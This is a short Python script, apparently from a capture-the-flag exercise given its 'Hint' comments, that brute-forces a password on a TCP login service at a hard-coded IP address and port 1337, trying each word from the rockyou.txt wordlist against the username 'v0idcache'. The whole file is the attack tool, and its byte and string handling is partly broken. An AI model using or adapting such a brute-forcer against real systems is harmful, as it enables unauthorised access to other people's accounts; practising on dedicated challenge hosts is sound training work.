import socket

host = "142.93.136.81" # IP address here
port = 1337 # Port here
wordlist = "rockyou.txt" # Point to wordlist file
username = "v0idcache\n"   # Hint: use OSINT

def brute_force():
    
    file = open(wordlist,"r")
    for word in file:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host,port))
        password = word   # Hint: use wordlist
        
        
        data = s.recv(1024)
        s.send(username.encode())
        print(data + " " + username)
        data = s.recv(1024)
        s.send(password)
        print(data + " " + password)

        data = s.recv(1024)
        if (data != "Fail\n"):
            print("Password" + password)
            break
        s.close()



if __name__ == '__main__':
    brute_force()